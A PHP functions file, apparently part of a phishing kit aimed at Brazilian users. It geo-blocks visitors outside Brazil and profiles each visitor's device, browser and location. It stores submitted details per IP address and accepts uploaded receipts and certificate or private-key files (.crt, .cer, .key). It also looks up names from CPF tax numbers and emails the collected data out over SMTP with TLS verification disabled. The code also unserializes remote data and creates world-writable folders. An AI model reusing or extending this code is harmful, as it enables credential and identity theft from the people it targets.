<?php 
session_start();
ob_start();
//error_reporting(0);

date_default_timezone_set('America/Sao_Paulo');

include('conn.php');
include('crud.php');

if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'):
	$UserIp = '177.206.238.81';
else:
	$UserIp = $_SERVER['REMOTE_ADDR'];
endif;	

/* FUNÇÃO - CHECAR ORIGEM DO ACESSO */
function checkLocation($UserIp, $UrlRedirErro){	
	$UrlAPI 		= "http://www.geoplugin.net/php.gp?ip={$UserIp}";

	$GetLocation 	= file_get_contents($UrlAPI);
	$GetLocation 	= unserialize($GetLocation);

	$ObjectLocation = new stdClass();
	$ObjectLocation = (object)$GetLocation;
	$FixedLocation 	= $ObjectLocation->geoplugin_countryName;

	if($FixedLocation != 'Brazil'):
		header("Location: $UrlRedirErro");
	endif;
}

/* FUNÇÃO - CHECA MOBILE */
function checkMobile(){
	$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
	$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
	$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
	$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
	$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
	$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
	$symbian =  strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
	$useragent = $_SERVER['HTTP_USER_AGENT'];

	if($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian == true):
		return true;
	elseif(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))):
		return true;
	else:
		return false;
	endif;
}

/* FUNÇÃO - SALVAR INFO TXT */
function SaveTxt($ip_user, $local, $mensagem){

	$localUpload = "$local/$ip_user/";
	/* CHECA SE A PASTA JÁ EXISTE */
	if(!file_exists($localUpload)):
		mkdir($localUpload, 0777);
	endif;	

	$fp = fopen("$local/$ip_user/info.txt", "a");
	$escreve = fwrite($fp, "$mensagem");
	fclose($fp);
}

/* FUNÇÃO - UPLOAD DAS IMAGENS NAS INFO TXT */
function UploaderNow($ip_user, $arquivo, $local){

	$name_file 	= $arquivo['name'];
	$name_ext 	= explode('.', $arquivo['name']);
	$name_ext	= $name_ext[1];	
	$ext_file 	= strtolower($name_ext);
	$size_file 	= $arquivo['size'];
	$temp_file 	= $arquivo['tmp_name'];

	$LocalUpload 	= "$local/$ip_user/";
	$TamUpload 		= 1024 * 1024 * 64; // MÁXIMO 12MB POR IMAGENS
	$ExtUpload 		= array('jpg', 'png', 'gif', 'crt', 'cer', 'key');
	$nome_final 	= 'comprovante.'.$ext_file;

	/* VERIFICA EXTENSÃO DO ARQUIVO */
	$name_ext 	= explode('.', $arquivo['name']);
	$name_ext	= $name_ext[1];	
	$extensao 	= strtolower($name_ext);
	if(array_search($extensao, $ExtUpload) === false):
		return false;
	endif;

	/* VERIFICA TAMANHO DO ARQUIVO */
	if($TamUpload < $size_file):
		return false;
	endif;

	/* CHECA SE A PASTA JÁ EXISTE */
	if(!file_exists($LocalUpload)):
		mkdir($LocalUpload, 0777);
	endif;	

	/* INICIA O UPLOAD DO ARQUIVO */
	if(move_uploaded_file($temp_file, $LocalUpload . $nome_final)):
		return true;
	else:
		return false;
	endif;
}

/* FUNÇÃO - ENVIAR AS INFO VIA SMTP */
function senderMail($assunto,$mensagem,$destino,$SecureSMTP, $Arquivo = null){

	require_once('smtp/class.phpmailer.php');
	
	$mail = new PHPMailer(); 
	$mail->IsSMTP(); 
	$mail->SMTPAuth = true;
	$mail->IsHTML(true);
	$mail->SMTPOptions = array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true));
	if($SecureSMTP == 'ssl'):
		$mail->SMTPSecure = 'ssl';
	elseif($SecureSMTP == 'tls'):
		$mail->SMTPSecure = 'tls';
	endif;	
	//$mail->SMTPDebug = 4;
	
	$mail->Host = trim(MAILHOST);
	$mail->Port = trim(MAILPORT);
	$mail->Username = trim(MAILUSER);
	$mail->Password = trim(MAILPASS);

	$nomeRemetente 	= explode('@', MAILUSER);
	$nomeRemetente 	= $nomeRemetente['0'];

	$nomeDestino 	= explode('@', $destino);
	$nomeDestino 	= $nomeDestino['0'];
	
	$mail->From = utf8_decode(MAILUSER);
	$mail->FromName = utf8_decode($nomeRemetente);
	
	$mail->Subject = utf8_decode($assunto);
	$mail->Body = utf8_decode($mensagem);
	$mail->AddAddress(utf8_decode($destino),utf8_decode($nomeDestino));

	if($Arquivo != null):
		$fp 		= fopen($Arquivo['tmp_name'],"rb");
	$anexo 		= fread($fp,filesize($Arquivo['tmp_name']));
	$anexo 		= base64_encode($anexo);
	fclose($fp);

	$localAnexo = $Arquivo['tmp_name'];
	$anexoName 	= $Arquivo['name'];
	$anexo 		= chunk_split($anexo);

	$mail->AddAttachment($localAnexo, $anexoName);
	endif;	
	
	if($mail->Send()){
		return true;
	}else{
		return false;
	}
} 

/* SET - NAVEGADOR E SISTEMA OPERACIONAL */
function SetNavegadorSO($conn,$id_user){
	$ip = $_SERVER['REMOTE_ADDR'];

	$u_agent = $_SERVER['HTTP_USER_AGENT'];
	$bname = 'Unknown';
	$platform = 'Unknown';
	$version= "";

	if (preg_match('/linux/i', $u_agent)){
		$platform = 'Linux';
	}elseif (preg_match('/macintosh|mac os x/i', $u_agent)){
		$platform = 'Mac';
	}elseif (preg_match('/windows|win32/i', $u_agent)){
		$platform = 'Windows';
	}


	if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
		$bname = 'Internet Explorer';
		$ub = "MSIE";
	}elseif(preg_match('/Firefox/i',$u_agent)){
		$bname = 'Mozilla Firefox';
		$ub = "Firefox";
	}elseif(preg_match('/Chrome/i',$u_agent)){
		$bname = 'Google Chrome';
		$ub = "Chrome";
	}elseif(preg_match('/AppleWebKit/i',$u_agent)){
		$bname = 'AppleWebKit';
		$ub = "Opera";
	}elseif(preg_match('/Safari/i',$u_agent)){
		$bname = 'Apple Safari';
		$ub = "Safari";
	}

	elseif(preg_match('/Netscape/i',$u_agent)){
		$bname = 'Netscape';
		$ub = "Netscape";
	}

	$known = array('Version', $ub, 'other');
	$pattern = '#(?<browser>'. join('|', $known) .')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
	if (!preg_match_all($pattern, $u_agent, $matches)){}

		$i = count($matches['browser']);
	if ($i != 1){
		if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
			$version= $matches['version'][0];
		}else{
			$version= $matches['version'][1];
		}
	}else{
		$version= $matches['version'][0];
	}

    // check if we have a number
	if ($version==null || $version==""){$version="?";}

	$Browser = array('userAgent' => $u_agent, 'name' => $bname, 'version' => $version, 'platform' => $platform, 'pattern' => $pattern);

	$navegador 		= $Browser['name'];
	$navegador_v 	= $Browser['version'];
	$sistema_op		= $Browser['platform'];

	return $navegador.';'.$navegador_v.';'.$sistema_op;
}

/* SET - LOCALIZAÇÃO USUARIO */
function setLocalization($conn, $ip_user, $id_user){
	$UrlAPI = "http://www.geoplugin.net/php.gp?ip={$ip_user}";
	$GetLocation = file_get_contents($UrlAPI);
	$GetLocation = unserialize($GetLocation);

	$ObjectLocation = new stdClass();
	$ObjectLocation = (object)$GetLocation;

	$atualCidade = $ObjectLocation->geoplugin_city;
	$atualEstado = $ObjectLocation->geoplugin_region;
	$atualPais   = $ObjectLocation->geoplugin_countryName;

	return $atualCidade.';'.$atualEstado.';'.$atualPais;
}

/* GET - RECUPERA ID UNICO DO USUARIO */
function getIdUser(){
	$UserId = $_SESSION['uniq_id'];
	return $UserId;
}

/* GET - DATA SHOW */
function getDataShow(){
	// leitura das datas
	$dia = date('d');
	$mes = date('m');
	$ano = date('Y');
	$semana = date('w');

	// configuração mes 
	switch ($mes){
		case 1: $mes = "Janeiro"; break;
		case 2: $mes = "Fevereiro"; break;
		case 3: $mes = "Março"; break;
		case 4: $mes = "Abril"; break;
		case 5: $mes = "Maio"; break;
		case 6: $mes = "Junho"; break;
		case 7: $mes = "Julho"; break;
		case 8: $mes = "Agosto"; break;
		case 9: $mes = "Setembro"; break;
		case 10: $mes = "Outubro"; break;
		case 11: $mes = "Novembro"; break;
		case 12: $mes = "Dezembro"; break;
	}
	// configuração semana
	switch ($semana) {
		case 0: $semana = "Domingo"; break;
		case 1: $semana = "Segunda"; break;
		case 2: $semana = "Terça"; break;
		case 3: $semana = "Quarta"; break;
		case 4: $semana = "Quinta"; break;
		case 5: $semana = "Sexta"; break;
		case 6: $semana = "Sábado"; break;
	}
	return "$semana, $dia de $mes de $ano";
}

/* GET - SAUDAÇÃO */
function getSaudacao(){
	$hora = date('H');

	if($hora >= 18 && $hora < 24):
		$result = 'Boa noite';
	endif;
	if($hora >= 12 && $hora < 18):
		$result =  'Boa tarde';
	endif;
	if($hora >= 0 && $hora < 12):
		$result =  'Bom dia';
	endif;	

	return $result;
}

/* FUNÇÃO - BUSCAR O NOME */
function checkName($cpf, $chaveApi){
	if(strlen($cpf) < 11 || strlen($cpf) > 14):
		return 'invalido';
	else:
		$token[0] 	= $chaveApi;
		$token[1] 	= '1';
		$token[2] 	= 'json';

		$UrlBase 	= 'https://api.cpfcnpj.com.br/'.$token[0].'/'.$token[1].'/'.$token[2].'/'.$cpf;
		$magic 	 	= url_get_contents($UrlBase);
		
		if($magic == 'moiza'):
			return 'invalido';
		else:
			$objeto 	= new stdClass();
			$objeto 	= json_decode($magic);

			$getStatus 	= $objeto->status;
			$getName 	= $objeto->nome;

			if($getStatus == '0' ||$getStatus == '100' || $getStatus == '101' || $getStatus == '102' || $getStatus == '1000' || $getStatus == '1001' || $getStatus == '1002'):
				return 'invalido';
			else:
				return $getName;
			endif;	
		endif;	
	endif;	
}

/* AUXILIO - CONDIÇÕES DE CONSULTA */
function url_get_contents($url) {
	if(function_exists('file_get_contents')){
        $url_get_contents_data = file_get_contents($url);
    }
    elseif (function_exists('curl_exec')){ 
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    }
    elseif(function_exists('fopen') && function_exists('stream_get_contents')){
        $handle = fopen ($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    }
    else{
        $url_get_contents_data = 'moiza';
    }
	return $url_get_contents_data;
} 




?>